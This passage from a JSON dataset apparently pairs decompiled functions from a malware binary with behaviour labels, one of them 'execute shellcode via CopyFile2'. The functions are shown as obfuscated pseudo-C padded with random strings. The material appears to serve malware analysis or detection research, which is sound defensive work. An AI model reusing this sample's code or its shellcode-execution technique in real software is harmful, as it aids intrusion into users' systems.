fcn.00402f72(0x20, uStack36, \"alagrwaaqeflpexbzgopysjrikdclpeh\");\n    piVar6 = piStack40;\n    piStack40[2] = 0;\n    piVar6[6] = 0;\n    piVar6[7] = 0xf;\n    *(piVar6 + 2) = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x46, uStack36, \"rrghfrymwvwzrszoacoddhkbtjpupppgocyovoqhxnzycvxywxgbisngziepybwkllfsni\");\n    piVar6 = piStack40;\n    *piStack40 = &stack0xffffff98;\n    piVar6[1] = 0xc31;\n    *(piVar6 + 0xe) = 1;\n    uStack20 = 0xffffffff;\n    fcn.0040585d();\n    puVar1 = puStack48;\n    uVar7 = uStack84;\n    if (0xf < uStack84) {\n        uVar7 = uStack84 + 1;\n        uVar9 = uStack104;\n        if (uVar7 < 0x1000) {\ncode_r0x00430542:\n            *(puStack48 + -4) = uVar7;\n            *(puVar1 + -8) = uVar9;\n            *(puVar1 + -0xc) = 0x430549;\n            uVar7 = fcn.00401a32(*(puVar1 + -8));\n            goto code_r0x0043054c;\n        }\n        uVar9 = *(uStack104 - 4);\n        if ((uStack104 - 4) - uVar9 < 0x20) {\n            uVar7 = uStack84 + 0x24;\n            goto code_r0x00430542;\n        }\n        uStack20 = 0;\n        *(puStack48 + -4) = 0x430978;\n        fcn.004047f5();\n        puVar11 = puVar1;\ncode_r0x00430978:\n        uStack20 = 1;\n        *(puVar11 + -4) = 0x430984;\n        fcn.004047f5();\ncode_r0x00430984:\n        uStack20 = 2;\n        *(puVar11 + -4) = 0x430990;\n        fcn.004047f5();\n        *(puVar11 + -4) = &stack0xfffffffc;\n        *(puVar11 + -0x84) = 0x43099c;\n        fcn.004052d1();\n        *(puVar11 + -0x84) = &stack0x00000008;\n        *(puVar11 + -0x104) = 0x4309ac;\n        fcn.004052d1();\n        *(puVar11 + -0x104) = &stack0x00000014;\n        *(puVar11 + -0x184) = 0x4309bc;\n        fcn.004052d1();\n        *(puVar11 + -0x184) = &stack0x00000020;\n        *(puVar11 + -0x204) = 0x4309cf;\n        uVar8 = fcn.00403a76();\n        return uVar8;\n    }\ncode_r0x0043054c:\n    uStack88 = 0;\n    uStack84 = 0xf;\n    uStack104 = uStack104 & 0xffffff00;\n    *(puVar1 + -4) = uVar7;\n    *(puVar1 + -0x28) = 0;\n    *(puVar1 + -0x18) = 0;\n    *(puVar1 + -0x14) = 0xf;\n    puVar1[-0x28] = 0;\n    puVar1[-0x3c] = uStack36;\n    *(puVar1 + -0x38) = \"nfctzpyyxcptfdsnkkhdabueelidgzxehqhmnpymkyqazbjehztrbyvnogtzatdzajnojgooaqjo\";\n    *(puVar1 + -0x40) = 0x4c;\n    *(puVar1 + -0x44) = 0x4305a0;\n    fcn.00402f72();\n    *(puVar1 + -0x30) = 0x40a50600;\n    *(puVar1 + -0x34) = 0;\n    puVar1[-0x2c] = 1;\n    uVar4 = *0x54229c;\n    uVar3 = *0x542298;\n    uVar8 = *0x542294;\n    *(puVar1 + -0x10) = *0x542290;\n    *(puVar1 + -0xc) = uVar8;\n    *(puVar1 + -8) = uVar3;\n    *(puVar1 + -4) = uVar4;\n    *(puVar1 + -0x44) = 0x4305c1;\n    uVar8 = fcn.0040673a();\n    *(puVar1 + -4) = uVar8;\n    *(puVar1 + -0x2c) = 0;\n    *(puVar1 + -0x1c) = 0;\n    *(puVar1 + -0x18) = 0xf;\n    puVar1[-0x2c] = 0;\n    puVar1[-0x44] = uStack36;\n    *(puVar1 + -0x40) = \"novnwkpecmltlrgnopjnnjvycijkhawuldquxiroqxlfnrvzx\";\n    *(puVar1 + -0x48) = 0x31;\n    *(puVar1 + -0x4c) = 0x430605;\n    fcn.00402f72();\n    puVar1[-0x3c] = 1;\n    *(puVar1 + -0x34) = 0x40d22640;\n    *(puVar1 + -0x38) = 0;\n    *(puVar1 + -0x30) = 0x203c;\n    *(puVar1 + -0x14) = 0xd6;\n    *(puVar1 + -0xc) = 0x40d7bf80;\n    *(puVar1 + -0x10) = 0;\n    puVar1[-8] = 0;\n    puVar1[-4] = 1;\n    uVar7 = *(puVar1 + -0x18);\n    if (0xf < uVar7) {\n        iVar2 = *(puVar1 + -0x2c);\n        uVar9 = uVar7 + 1;\n        iVar10 = iVar2;\n        if (0xfff < uVar9) {\n            iVar10 = *(iVar2 + -4);\n            puVar11 = puVar1 + -0x48;\n            if (0x1f < (iVar2 + -4) - iVar10) goto code_r0x00430978;\n            uVar9 = uVar7 + 0x24;\n        }\n        *(puVar1 + -0x4c) = uVar9;\n        *(puVar1 + -0x50) = iVar10;\n        *(puVar1 + -0x54) = 0x43066f;\n        uVar7 = fcn.00401a32(*(puVar1 + -0x50));\n    }\n    piStack40 = puVar1;\n    *(puVar1 + -4) = uVar7;\n    puStack44 = puVar1 + -0x20;\n    *(puVar1 + -0x20) = 0;\n    *(puVar1 + -0x10) = 0;\n    *(puVar1 + -0xc) = 0xf;\n    puVar1[-0x20] = 0;\n    puVar1[-0x84] = uStack36;\n    *(puVar1 + -0x80) = \"chwpeppubmmvvzziaesddqvcrggyyuqjlhtxtzwlce\";\n    *(puVar1 + -0x88) = 0x2a;\n    *(puVar1 + -0x8c) = 0x4306ba;\n    fcn.00402f72();\n    *(puVar1 + -0x40) = 0;\n    *(puVar1 + -0x30) = 0;\n    *(puVar1 + -0x2c) = 0xf;\n    puStack48 = puVar1 + -0x7c;\n    puVar1[-0x40] = 0;\n    uStack20 = 5;\n    puVar1[-0x90] = uStack36;\n    *(puVar1 + -0x8c) = \"otvxiviindvgruwsfavzsdjwrdjjiyrdemnnqmbuhvffbuiigwxcridacgliambmokvm\";\n    *(puVar1 + -0x94) = 0x44;\n    *(puVar1 + -0x98) = 0x4306fe;\n    fcn.00402f72();\n    puVar5 = puStack48;\n    uVar4 = *0x5422bc;\n    uVar3 = *0x5422b8;\n    uVar8 = *0x5422b4;\n    puStack48[0xb] = *0x5422b0;\n    puVar5[0xc] = uVar8;\n    puVar5[0xd] = uVar3;\n    puVar5[0xe] = uVar4;\n    puVar5[10] = 0xb;\n    *(puVar5 + 0x1f) = 0x64666261;\n    *(puVar5 + 0x23) = 0;\n    uVar4 = str.xiijpqpa._4_4_;\n    uVar3 = str.xiijpqpa._0_4_;\n    uVar8 = *0x5422d4;\n    puVar5[4] = *0x5422d0;\n    puVar5[5] = uVar8;\n    puVar5[6] = uVar3;\n    puVar5[7] = uVar4;\n    *puVar5 = 0x69726f6d;\n    puVar5[1] = 0x79636e6d;\n    *(puVar5 + 2) = 0x7966;\n    *(puVar5 + 10) = 0;\n    puVar5[0x16] = 0x40eb3a00;\n    puVar5[0x15] = 0;\n    *(puVar5 + 0x1d) = 0;\n    puVar5[0x1e] = 0xf6a;\n    uStack20 = 0xffffffff;\n    *(puVar1 + -0x98) = 0x430765;\n    uVar8 = fcn.00403049();\n    puVar11 = piStack40;\n    puStack48 = piStack40;\n    *(piStack40 + -4) = uVar8;\n    puStack44 = piStack40 + -0x20;\n    *(piStack40 + -0x20) = 0;\n    *(piStack40 + -0xc) = 0xf;\n    *(piStack40 + -0x10) = 1;\n    *(piStack40 + -0x20) = 0x70;\n    puStack52 = piStack40 + -0x38;\n    *(piStack40 + -0x38) = 0;\n    *(piStack40 + -0x28) = 0;\n    *(piStack40 + -0x24) = 0xf;\n    puVar1 = piStack40 + -0x38;\n    piStack40 = piStack40 + -0x60;\n    *puVar1 = 0;\n    uStack20 = 6;\n    puVar11[-0x68] = uStack36;\n    *(puVar11 + -100) = \"phpxwvxelonqoparfqqxlfrvctkgsllwnvynofpvnmlwhvxumvgfuzstxcxdjasryiknbfbquimiqbwighiunxkdj\";\n    *(puVar11 + -0x6c) = 0x59;\n    *(puVar11 + -0x70) = 0x4307d9;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    piStack40[4] = 0;\n    piVar6[8] = 0;\n    piVar6[9] = 0xf;\n    *(piVar6 + 4) = 0;\n    uStack20 = 7;\n    puVar11[-0x74] = uStack36;\n    *(puVar11 + -0x70) = \"afebgyleyaicnlxipqoqjczepcocbssesdyblhnvrlgiwrupduokbrakroeabnpnpvmjvdafpthjaiwesgqwsjyid\";\n    *(puVar11 + -0x78) = 0x59;\n    *(puVar11 + -0x7c) = 0x43081f;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    *piStack40 = &stack0xffffffb0;\n    piVar6[2] = 0x40a48200;\n    piVar6[1] = 0;\n    *(piVar6 + 3) = 1;\n    *(piVar6 + 0x16) = 0;\n    *(piVar6 + 0x17) = 0;\n    uStack20 = 0xffffffff;\n    *(puVar11 + -0x7c) = 0x43084d;\n    fcn.00405f15();\n    puVar1 = puStack48;\n    if (0xf < uStack60) {\n        uVar7 = uStack60 + 1;\n        uVar9 = uStack80;\n        if (0xfff < uVar7) {\n            uVar9 = *(uStack80 - 4);\n            puVar11 = puStack48;\n            if (0x1f < (uStack80 - 4) - uVar9) goto code_r0x00430984;\n            uVar7 = uStack60 + 0x24;\n        }\n        *(puStack48 + -4) = uVar7;\n        *(puVar1 + -8) = uVar9;\n        *(puVar1 + -0xc) = 0x430885;\n        fcn.00401a32(*(puVar1 + -8));\n    }\n    uStack64 = 0;\n    uStack60 = 0xf;\n    uStack80 = uStack80 & 0xffffff00;\n    *(puVar1 + -0x1c) = 0x4308a2;\n    fcn.00402a36();\n    piStack40 = puVar1 + -100;\n    puStack48 = puVar1 + -0x30;\n    *(puVar1 + -0x30) = 0;\n    *(puVar1 + -0x1c) = 0xf;\n    *(puVar1 + -0x20) = 0;\n    puVar1[-0x30] = 0;\n    puStack44 = puVar1 + -0x4c;\n    *(puVar1 + -0x4c) = 0;\n    *(puVar1 + -0x3c) = 0;\n    *(puVar1 + -0x38) = 0xf;\n    puVar1[-0x4c] = 0;\n    uStack20 = 8;\n    puVar1[-0x6c] = uStack36;\n    *(puVar1 + -0x68) = \"uefvulrygesjnaqfjjxvwiugljzpecjwebynsanqiw\";\n    *(puVar1 + -0x70) = 0x2a;\n    *(puVar1 + -0x74) = 0x43090d;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0;\n    puVar5[4] = 0;\n    puVar5[5] = 0xf;\n    *puVar5 = 0;\n    uStack20 = 9;\n    puVar1[-0x78] = uStack36;\n    *(puVar1 + -0x74) = \"smgqbmxhauwmdahdytujemrdjhmcbllprqawjqdmgoackupejgbdtmbduktrbt\";\n    *(puVar1 + -0x7c) = 0x3e;\n    *(puVar1 + -0x80) = 0x43094c;\n    fcn.00402f72();\n    *(piStack40 + 0xc) = 0;\n    *(puVar1 + -0x80) = 0x430958;\n    fcn.0040457f();\n    *in_FS_OFFSET = iStack28;\n    return uStack56;\n}\n",
        "token_count": 4319
    },
    "00432f10": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __fastcall fcn.00432f10(int32_t param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    int32_t *piVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint *puVar16;\n    int32_t *in_FS_OFFSET;\n    uint auStack244 [11];\n    uint uStack200;\n    uint uStack184;\n    uint uStack180;\n    int32_t iStack164;\n    uint32_t auStack160 [4];\n    uint uStack144;\n    uint32_t uStack140;\n    uint32_t uStack136;\n    uint uStack120;\n    uint32_t uStack116;\n    uint32_t uStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t *piStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack44 = &stack0xffffff60;\n    puStack32 = &stack0xffffff60;\n    uStack24 = 0x44c680;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iStack60 = param_1 + 0xc;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0xf;\n    *(param_1 + 0xc) = 0;\n    iStack164 = param_1 + 0x28;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x38) = 0;\n    *(param_1 + 0x3c) = 0xf;\n    *(param_1 + 0x28) = 0;\n    piStack40 = &stack0xffffff0c;\n    puStack48 = &stack0xffffff38;\n    uStack184 = 0;\n    uStack180 = 0xf;\n    uStack200 = 0;\n    uStack20 = 6;\n    iStack64 = param_1;\n    iStack56 = iStack164;\n    fcn.00402f72(0x1e);\n    puVar16 = piStack40;\n    piStack40[1] = 0;\n    puVar16[5] = 0;\n    puVar16[6] = 0xf;\n    *(puVar16 + 1) = 0;\n    uStack20 = 0x11;\n    fcn.00402f72(0x51, uStack36, \"krludctvlfaqjudbapohyorlhwwprqkndidbsjxboueksgoqytepifasiyetnptrfptzgpxzkdmtcobqw\");\n    puVar16 = piStack40;\n    *piStack40 = 0xf6d;\n    puVar16[8] = 0x40f2f0b0;\n    puVar16[7] = 0;\n    *(puVar16 + 9) = 0;\n    puVar16[10] = 0xfa7;\n    puVar16[0x11] = 0x1596;\n    *(puVar16 + 0x12) = 0;\n    *(puVar16 + 0x13) = 0;\n    *(puVar16 + 0x14) = 1;\n    uStack20 = 6;\n    uVar7 = fcn.0040149c();\n    puVar16 = puStack44;\n    puStack44[-1] = uVar7;\n    piStack40 = puVar16 + -0x12;\n    puStack48 = puVar16 + -0xb;\n    puVar16[-0xb] = 0;\n    puVar16[-7] = 0;\n    puVar16[-6] = 0xf;\n    *(puVar16 + -0xb) = 0;\n    *(puVar16 + -0x14) = uStack36;\n    puVar16[-0x13] = \"gsdqluyvxbybatskvihnfqibsdewdtyfklccpscmu\";\n    puVar16[-0x15] = 0x29;\n    puVar16[-0x16] = 0x4330a1;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *(piStack40 + 4) = 0;\n    *(puVar5 + 0x14) = 0;\n    *(puVar5 + 0x18) = 0xf;\n    puVar5[4] = 0;\n    uStack20 = 0x10;\n    *(puVar16 + -0x17) = uStack36;\n    puVar16[-0x16] = \"zaxutgajrryooqlmgzegmyovugtidbjojuvzsbpjim\";\n    puVar16[-0x18] = 0x2a;\n    puVar16[-0x19] = 0x4330e7;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 1;\n    puVar5[0x34] = 1;\n    puVar5[0x38] = 0;\n    puVar5[0x3c] = 0;\n    *(puVar5 + 0x44) = 0x40e92d80;\n    *(puVar5 + 0x40) = 0;\n    uStack20 = 6;\n    puVar16[-0x19] = 0x433113;\n    uVar7 = fcn.004052c7();\n    puVar16 = puStack44;\n    puStack44[-1] = uVar7;\n    piStack40 = puVar16 + -0x1d;\n    puStack48 = puVar16 + -10;\n    puVar16[-10] = 0;\n    puVar16[-6] = 0;\n    puVar16[-5] = 0xf;\n    *(puVar16 + -10) = 0;\n    *(puVar16 + -0x1f) = uStack36;\n    puVar16[-0x1e] = \"gdeoojvpuogejrbvzqfhzkswlasxpugoewmwhcwfxfnjfqvruyovtvaylbxsbvaghqkdkwwjzgtlkxxprshfkpknilamtqrhg\"\n    ;\n    puVar16[-0x20] = 0x61;\n    puVar16[-0x21] = 0x43315c;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    piStack52 = piStack40 + 7;\n    piStack40[7] = 0;\n    puVar4[0xb] = 0;\n    puVar4[0xc] = 0xf;\n    *(puVar4 + 7) = 0;\n    uStack20 = 0xe;\n    *(puVar16 + -0x22) = uStack36;\n    puVar16[-0x21] = \"dtrhsszlmkpthjnaatjsxqxspgebigcryssuhv\";\n    puVar16[-0x23] = 0x26;\n    puVar16[-0x24] = 0x4331a5;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    *piStack40 = 0;\n    puVar4[4] = 0;\n    puVar4[5] = 0xf;\n    *puVar4 = 0;\n    uStack20 = 0xf;\n    *(puVar16 + -0x25) = uStack36;\n    puVar16[-0x24] = \"idnnxamtpeuuvjugpcnmrykvijwqwxxwmjuwhtcueczwcavmdjqkajtmbkgvybpednyztfa\";\n    puVar16[-0x26] = 0x47;\n    puVar16[-0x27] = 0x4331e4;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    piStack40[6] = 0x7a6;\n    puVar4[0xd] = 0xe30;\n    uVar2 = *0x5422fc;\n    uVar1 = *0x5422f8;\n    uVar7 = *0x5422f4;\n    puVar4[0xe] = *0x5422f0;\n    puVar4[0xf] = uVar7;\n    puVar4[0x10] = uVar1;\n    puVar4[0x11] = uVar2;\n    puVar4[0x12] = 0xd6e;\n    uVar2 = *0x54231c;\n    uVar1 = *0x542318;\n    uVar7 = *0x542314;\n    puVar4[0x19] = *0x542310;\n    puVar4[0x1a] = uVar7;\n    puVar4[0x1b] = uVar1;\n    puVar4[0x1c] = uVar2;\n    puVar16[-0x27] = 0x433217;\n    fcn.004040e8();\n    puVar16 = puStack44;\n    uStack20 = 6;\n    puVar12 = puStack44 + -1;\n    puStack44[-1] = 0x40;\n    puVar16[-2] = 0x433228;\n    uVar7 = fcn.004024b9(*puVar12, *puVar16);\n    puVar16[-1] = 0x40;\n    puVar16[-2] = uVar7;\n    puVar16[-3] = 0x433233;\n    fcn.00401a32(puVar16[-2]);\n    piStack40 = puVar16 + -0x18;\n    puStack48 = puVar16 + -8;\n    puStack44 = puVar16;\n    puVar16[-3] = 0xf;\n    puVar16[-4] = 9;\n    puVar16[-8] = 0x767a6675;\n    puVar16[-7] = 0x6d677976;\n    *(puVar16 + -6) = 0x6f;\n    puVar16[-0x15] = 0;\n    puVar16[-0x11] = 0;\n    puVar16[-0x10] = 0xf;\n    *(puVar16 + -0x15) = 0;\n    uStack20 = 0xd;\n    *(puVar16 + -0x1a) = uStack36;\n    puVar16[-0x19] = \"hvioamamasbnpeyjtsgklhfbjzancd\";\n    puVar16[-0x1b] = 0x1e;\n    puVar16[-0x1c] = 0x4332aa;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    piStack40[1] = 0x40e63f40;\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4[10] = 0x404f8000;\n    puVar4[9] = 0;\n    puVar4[0xb] = 0x1471;\n    uVar2 = *0x54233c;\n    uVar1 = *0x542338;\n    uVar7 = *0x542334;\n    puVar4[0xc] = *0x542330;\n    puVar4[0xd] = uVar7;\n    puVar4[0xe] = uVar1;\n    puVar4[0xf] = uVar2;\n    puVar4[0x16] = 0x526;\n    *(puVar4 + 0x17) = 0;\n    uStack20 = 6;\n    puVar16[-0x1c] = 0x4332f5;\n    uVar7 = fcn.004033a5();\n    puVar16 = puStack44;\n    puVar13 = puStack44 + -1;\n    puStack44[-1] = uVar7;\n    piStack40 = puVar16 + -0x16;\n    puStack48 = puVar16 + -6;\n    *puVar13 = 0xf;\n    puVar16[-2] = 0xf;\n    puVar16[-6] = 0x676d7067;\n    puVar16[-5] = 0x74737163;\n    puVar16[-4] = 0x76626474;\n    *(puVar16 + -0xd) = 0x74796c76;\n    *(puVar16 + -9) = 0;\n    piStack52 = puVar16 + -0xf;\n    puVar16[-0xf] = 0;\n    puVar16[-0xb] = 0;\n    puVar16[-10] = 0xf;\n    *(puVar16 + -0xf) = 0;\n    uStack20 = 0xb;\n    *(puVar16 + -0x18) = uStack36;\n    puVar16[-0x17] = \"cbdqfsfubcneyegajmdwfvcybxhlmkumfdavmabjdoapnheyfpjvxfxi\";\n    puVar16[-0x19] = 0x38;\n    puVar16[-0x1a] = 0x433379;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    *piStack40 = 0;\n    puVar4[4] = 0;\n    puVar4[5] = 0xf;\n    *puVar4 = 0;\n    uStack20 = 0xc;\n    *(puVar16 + -0x1b) = uStack36;\n    puVar16[-0x1a] = \"lbtivuylzoukbyqbkwjblteswddtqxbbgrembltjpbbbxgujhiuxslswmtbliykvofsh\";\n    puVar16[-0x1c] = 0x44;\n    puVar16[-0x1d] = 0x4333b8;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    piStack40[6] = 0x428;\n    *(puVar4 + 0xd) = 1;\n    *(puVar4 + 0xe) = 1;\n    puVar4[0xf] = 0xcbd;\n    uStack20 = 6;\n    puVar16[-0x1d] = 0x4333dd;\n    uVar7 = fcn.00404c0f();\n    puVar16 = puStack44;\n    puVar14 = puStack44 + -1;\n    puStack44[-1] = uVar7;\n    piStack40 = puVar16 + -0x13;\n    puStack48 = puVar16 + -6;\n    puVar16[-6] = 0;\n    puVar16[-2] = 0;\n    *puVar14 = 0xf;\n    *(puVar16 + -6) = 0;\n    *(puVar16 + -0x15) = uStack36;\n    puVar16[-0x14] = \"aedzaprqepakdzhlfdbrbzonauuoqbwpoaudirdu\";\n    puVar16[-0x16] = 0x28;\n    puVar16[-0x17] = 0x433426;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    piStack40[5] = 0;\n    piVar6[9] = 0;\n    piVar6[10] = 0xf;\n    *(piVar6 + 5) = 0;\n    uStack20 = 10;\n    *(puVar16 + -0x18) = uStack36;\n    puVar16[-0x17] = \"gaynxdnpeuhqhnyswlqoypalfmfynzahypwupqgkynu\";\n    puVar16[-0x19] = 0x2b;\n    puVar16[-0x1a] = 0x43346c;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    *piStack40 = &stack0xffffff60;\n    iVar3 = *0x54235c;\n    iVar11 = *0x542358;\n    iVar10 = *0x542354;\n    piVar6[1] = *0x542350;\n    piVar6[2] = iVar10;\n    piVar6[3] = iVar11;\n    piVar6[4] = iVar3;\n    piVar6[0xb] = 0x9f6;\n    piVar6[0xc] = 0x72f;\n    uStack20 = 6;\n    puVar16[-0x1a] = 0x43349c;\n    fcn.004035fd();\n    puVar16 = puStack44;\n    uVar8 = uStack140;\n    if (0xf < uStack140) {\n        uVar8 = uStack140 + 1;\n        uVar9 = auStack160[0];\n        if (uVar8 < 0x1000) {\ncode_r0x004334d3:\n            puStack44[-1] = uVar8;\n            puVar16[-2] = uVar9;\n            puVar16[-3] = 0x4334da;\n            uVar8 = fcn.00401a32(puVar16[-2]);\n            goto code_r0x004334dd;\n        }\n        uVar9 = *(auStack160[0] - 4);\n        if ((auStack160[0] - 4) - uVar9 < 0x20) {\n            uVar8 = uStack140 + 0x24;\n            goto code_r0x004334d3;\n        }\n        uStack20 = 0;\n        puStack44[-1] = 0x433a57;\n        fcn.004047f5();\ncode_r0x00433a57:\n        uStack20 = 1;\n        puVar16[-1] = 0x433a63;\n        fcn.004047f5();\ncode_r0x00433a63:\n        uStack20 = 2;\n        *(puVar16 + -4) = 0x433a6f;\n        fcn.004047f5();\ncode_r0x00433a6f:\n        uStack20 = 3;\n        puVar16[-1] = 0x433a7b;\n        fcn.004047f5();\ncode_r0x00433a7b:\n        uStack20 = 4;\n        puVar16[-1] = 0x433a87;\n        fcn.004047f5();\ncode_r0x00433a87:\n        uStack20 = 5;\n        *(puVar16 + -4) = 0x433a93;\n        fcn.004047f5();\n        *(puVar16 + -4) = &stack0xfffffffc;\n        *(puVar16 + -0x7c) = 0x433aac;\n        fcn.004052d1();\n        *(puVar16 + -0x7c) = &stack0x00000008;\n        *(puVar16 + -0xf4) = 0x433abc;\n        fcn.004052d1();\n        *(puVar16 + -0xf4) = &stack0x00000014;\n        *(puVar16 + -0x16c) = 0x433acc;\n        fcn.004052d1();\n        *(puVar16 + -0x16c) = &stack0x00000020;\n        *(puVar16 + -0x1e4) = 0x433adc;\n        fcn.004052d1();\n        *(puVar16 + -0x1e4) = &stack0x0000002c;\n        *(puVar16 + -0x25c) = 0x433aec;\n        fcn.004052d1();\n        *(puVar16 + -0x25c) = &stack0x00000038;\n        *(puVar16 + -0x2d4) = 0x433afc;\n        fcn.004052d1();\n        *(puVar16 + -0x2d4) = &stack0x00000044;\n        *(puVar16 + -0x34c) = 0x433b0f;\n        iVar10 = fcn.00403a76();\n        return iVar10;\n    }\ncode_r0x004334dd:\n    uStack144 = 0;\n    uStack140 = 0xf;\n    auStack160[0] = auStack160[0] & 0xffffff00;\n    puStack44 = puVar16;\n    puVar16[-1] = uVar8;\n    piStack40 = puVar16 + -0x1b;\n    puStack48 = puVar16 + -6;\n    puVar16[-6] = 0;\n    puVar16[-2] = 0;\n    puVar16[-1] = 0xf;\n    *(puVar16 + -6) = 0;\n    *(puVar16 + -0x1d) = uStack36;\n    puVar16[-0x1c] = \"wougbrwkukxwupaiwqqgoylhthlrduqbwqlgqxryzrbquhxjbixdrynlhbedbcjdrajsdblfirntrc\";\n    puVar16[-0x1e] = 0x4e;\n    puVar16[-0x1f] = 0x433541;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    piStack52 = piStack40 + 0xb;\n    piStack40[0xb] = 0;\n    piVar6[0xf] = 0;\n    piVar6[0x10] = 0xf;\n    *(piVar6 + 0xb) = 0;\n    uStack20 = 8;\n    *(puVar16 + -0x20) = uStack36;\n    puVar16[-0x1f] = \"injaaknmkhbccvotbwtgmukxiqonvtnqinwdjecdfnfccziubrwosxfqtmwgixfipftnqroninpwcarostay\";\n    puVar16[-0x21] = 0x54;\n    puVar16[-0x22] = 0x433588;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    piStack40[3] = 0;\n    piVar6[7] = 0;\n    piVar6[8] = 0xf;\n    *(piVar6 + 3) = 0;\n    uStack20 = 9;\n    *(puVar16 + -0x23) = uStack36;\n    puVar16[-0x22] = \"rckswvvdlqoadsxgndmqgnsxutqbagaepcocitbsbcevclkerovmzojamnzzxyprxgph\";\n    puVar16[-0x24] = 0x44;\n    puVar16[-0x25] = 0x4335ce;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    *piStack40 = &stack0xffffff78;\n    piVar6[2] = 0x40de4d40;\n    piVar6[1] = 0;\n    piVar6[10] = 0x40c93000;\n    piVar6[9] = 0;\n    *(piVar6 + 0x11) = 1;\n    piVar6[0x12] = 0x1292;\n    *(piVar6 + 0x13) = 0;\n    piVar6[0x14] = 0xa59;\n    uStack20 = 6;\n    puVar16[-0x25] = 0x433617;\n    fcn.004051b4();\n    puVar4 = puStack44;\n    uVar8 = uStack116;\n    if (0xf < uStack116) {\n        uVar8 = uStack116 + 1;\n        uVar9 = uStack136;\n        if (0xfff < uVar8) {\n            uVar9 = *(uStack136 - 4);\n            puVar16 = puStack44;\n            if (0x1f < (uStack136 - 4) - uVar9) goto code_r0x00433a57;\n            uVar8 = uStack116 + 0x24;\n        }\n        puStack44[-1] = uVar8;\n        puVar4[-2] = uVar9;\n        puVar4[-3] = 0x433652;\n        uVar8 = fcn.00401a32(puVar4[-2]);\n    }\n    uStack120 = 0;\n    uStack116 = 0xf;\n    uStack136 = uStack136 & 0xffffff00;\n    puStack44 = puVar4;\n    puVar4[-1] = uVar8;\n    piStack40 = puVar4 + -0x12;\n    puVar4[-0xd] = 0;\n    puVar4[-9] = 0;\n    puVar4[-8] = 0xf;\n    *(puVar4 + -0xd) = 0;\n    puVar16 = puVar4 + -0x15;\n    *(puVar4 + -0x14) = uStack36;\n    puVar4[-0x13] = \"xcmmnwhsmiysnbulqzfkojcoaxprsixrpefggobcmf\";\n    puVar4[-0x15] = 0x2a;\n    puVar4[-0x16] = 0x4336b0;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    iVar3 = *0x54237c;\n    iVar11 = *0x542378;\n    iVar10 = *0x542374;\n    *piStack40 = *0x542370;\n    piVar6[1] = iVar10;\n    piVar6[2] = iVar11;\n    piVar6[3] = iVar3;\n    piVar6[4] = 0x40d55f40;\n    *(piVar6 + 0xb) = 1;\n    iVar3 = *0x54239c;\n    iVar11 = *0x542398;\n    iVar10 = *0x542394;\n    piVar6[0xc] = *0x542390;\n    piVar6[0xd] = iVar10;\n    piVar6[0xe] = iVar11;\n    piVar6[0xf] = iVar3;\n    piVar6[0x11] = 0x40d86300;\n    piVar6[0x10] = 0;\n    uVar8 = piVar6[10];\n    if (0xf < uVar8) {\n        iVar10 = piVar6[5];\n        uVar9 = uVar8 + 1;\n        iVar11 = iVar10;\n        if (0xfff < uVar9) {\n            iVar11 = *(iVar10 + -4);\n            if (0x1f < (iVar10 + -4) - iVar11) goto code_r0x00433a63;\n            uVar9 = uVar8 + 0x24;\n        }\n        puVar4[-0x16] = uVar9;\n        puVar4[-0x17] = iVar11;\n        puVar4[-0x18] = 0x433716;\n        fcn.00401a32(puVar4[-0x17]);\n    }\n    puVar16 = puStack44;\n    puVar15 = puStack44 + -1;\n    puStack44[-1] = 0x40;\n    puVar16[-2] = 0x433723;\n    uVar7 = fcn.004024b9(*puVar15, *puVar16);\n    puVar16[-1] = 0x40;\n    puVar16[-2] = uVar7;\n    puVar16[-3] = 0x43372e;\n    fcn.00401a32(puVar16[-2]);\n    puVar16[-1] = 0x50;\n    puVar16[-2] = 0x433738;\n    uVar7 = fcn.004024b9(puVar16[-1], *puVar16);\n    puVar16[-1] = 0x50;\n    puVar16[-2] = uVar7;\n    puVar16[-3] = 0x433743;\n    fcn.00401a32(puVar16[-2]);\n    piStack40 = puVar16 + -0x11;\n    puStack44 = puVar16;\n    puVar16[-9] = 0;\n    puVar16[-5] = 0;\n    puVar16[-4] = 0xf;\n    *(puVar16 + -9) = 0;\n    *(puVar16 + -0x13) = uStack36;\n    puVar16[-0x12] = \"enkgwpkbqhmmstbyczoeghouhbruaahevxexooxjrawrglmelppdvmg\";\n    puVar16[-0x14] = 0x37;\n    puVar16[-0x15] = 